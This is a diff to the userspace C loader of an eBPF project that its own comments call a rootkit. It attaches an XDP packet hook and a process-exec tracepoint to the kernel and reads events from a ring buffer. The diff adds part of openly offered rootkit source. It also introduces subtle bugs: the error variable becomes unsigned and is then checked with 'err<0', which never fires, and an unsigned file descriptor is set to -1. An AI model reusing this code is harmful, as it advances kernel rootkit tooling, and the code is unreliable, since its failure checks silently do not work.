@@ -7,6 +7,7 @@
 #include <linux/if_link.h>
 #include <net/if.h>
 #include <unistd.h>
+#include <bpf/bpf.h>
 
 #include "xdp_filter.skel.h"
 
@@ -106,7 +107,7 @@ static int handle_rb_event(void *ctx, void *data, size_t data_size){
 int main(int argc, char**argv){
     struct ring_buffer *rb = NULL;
     struct xdp_filter_bpf *skel;
-    int err;
+    __u32 err;
 
 	//Ready to be used
 	/*for (int arg = 1; arg < argc; arg++) {
@@ -116,7 +117,7 @@ int main(int argc, char**argv){
 		}
 	}*/
 	
-	unsigned int ifindex; 
+	__u32 ifindex; 
 
 	/* Parse command line arguments */
 	int opt;
@@ -154,45 +155,84 @@ int main(int argc, char**argv){
         }
     }
 	
-	// Set up libbpf errors and debug info callback
+	//Set up libbpf errors and debug info callback
 	libbpf_set_print(libbpf_print_fn);
 
 	// Bump RLIMIT_MEMLOCK to be able to create BPF maps
 	bump_memlock_rlimit();
 
-	// Cleaner handling of Ctrl-C
+	//Cleaner handling of Ctrl-C
 	signal(SIGINT, sig_handler);
 	signal(SIGTERM, sig_handler);
 
-    // Load and verify BPF application
+    //Open and create BPF application in the kernel
 	skel = xdp_filter_bpf__open();
 	if (!skel) {
 		fprintf(stderr, "Failed to open and load BPF skeleton\n");
 		return 1;
 	}
 
-	// Load & verify BPF programs */
+	//Load & verify BPF program
 	err = xdp_filter_bpf__load(skel);
 	if (err) {
 		fprintf(stderr, "Failed to load and verify BPF skeleton\n");
 		goto cleanup;
 	}
 
-    // Attach tracepoint for
-	err = xdp_filter_bpf__attach(skel);
+
+	//Attack BPF program to network interface
+	//New way of doing it: it allows for future addition of multiple 
+	//XDP programs attached to same interface if needed
+	//Also done this way to modularize attaching the different tracepoints
+	//of the rootkit
+	/** @ref Test suite by readhat ebpf devs on XDP
+	 *  https://git.zx2c4.com/linux/plain/tools/testing/selftests/bpf/prog_tests/xdp_link.c 
+	 */
+	struct bpf_prog_info prog_info;
+	__u32 bpf_prog_info_size = sizeof(prog_info);
+	__u32 xdp_prog_fd = bpf_program__fd(skel->progs.xdp_receive);
+	__u32 xdp_prog_id_old = 0;
+	__u32 xdp_prog_id_new;
+	DECLARE_LIBBPF_OPTS(bpf_xdp_set_link_opts, opts, .old_fd = -1);
+	int flags = XDP_FLAGS_REPLACE;
+	
+	memset(&prog_info, 0, bpf_prog_info_size);
+	err = bpf_obj_get_info_by_fd(xdp_prog_fd, &prog_info, &bpf_prog_info_size);
+	if(err<0){
+		fprintf(stderr, "Failed to setup xdp link\n");
+		goto cleanup;
+	}
+	xdp_prog_id_new = prog_info.id;
+	
+	//Check whether there exists previously loaded XDP program
+	err = bpf_get_link_xdp_id(ifindex, &xdp_prog_id_old, 0);
+	if(err<0 || (xdp_prog_id_old!=0 && xdp_prog_id_old!=xdp_prog_id_new)){
+		fprintf(stderr, "Xdp program found id--> old:%u != new:%u\n", xdp_prog_id_old, xdp_prog_id_new);
+		fprintf(stderr,"This should not happen, since our xdp program is removed automatically between calls\nRun `ip link set dev lo xdpgeneric off` to detach whichever program is running");
+		//TODO automatically force the reattach
+		goto cleanup;
+	}
+
+    // Attach loaded xdp program
+	skel->links.xdp_receive = bpf_program__attach_xdp(skel->progs.xdp_receive, ifindex);
+	err = libbpf_get_error(skel->links.xdp_receive);
 	if (err) {
 		fprintf(stderr, "Failed to attach BPF skeleton\n");
 		goto cleanup;
 	}
 
-	//Attack BPF program to network interface
-	int flags = XDP_FLAGS_SKB_MODE;
-    int fd = bpf_program__fd(skel->progs.xdp_receive);
-    err = bpf_set_link_xdp_fd(ifindex, fd, flags);
+	//Attach sched module (testing)
+	skel->links.handle_sched_process_exec = bpf_program__attach(skel->progs.handle_sched_process_exec);
+	err = libbpf_get_error(skel->links.handle_sched_process_exec);
+	if (err<0) {
+		fprintf(stderr, "Failed to attach sched module\n");
+		goto cleanup;
+	}
+	
 
-	/* Set up ring buffer polling */
+	// Set up ring buffer polling --> Main communication buffer kernel->user
 	rb = ring_buffer__new(bpf_map__fd(skel->maps.rb_comm), handle_rb_event, NULL, NULL);
-	if (!rb) {
+	if (rb==NULL) {
 		err = -1;
 		fprintf(stderr, "Failed to create ring buffer\n");
 		goto cleanup;
@@ -215,7 +255,7 @@ int main(int argc, char**argv){
 	}
 
 	//Received signal to stop, detach program from network interface
-	fd = -1;
+	__u32 fd = -1;
     err = bpf_set_link_xdp_fd(ifindex, fd, flags);
 
 
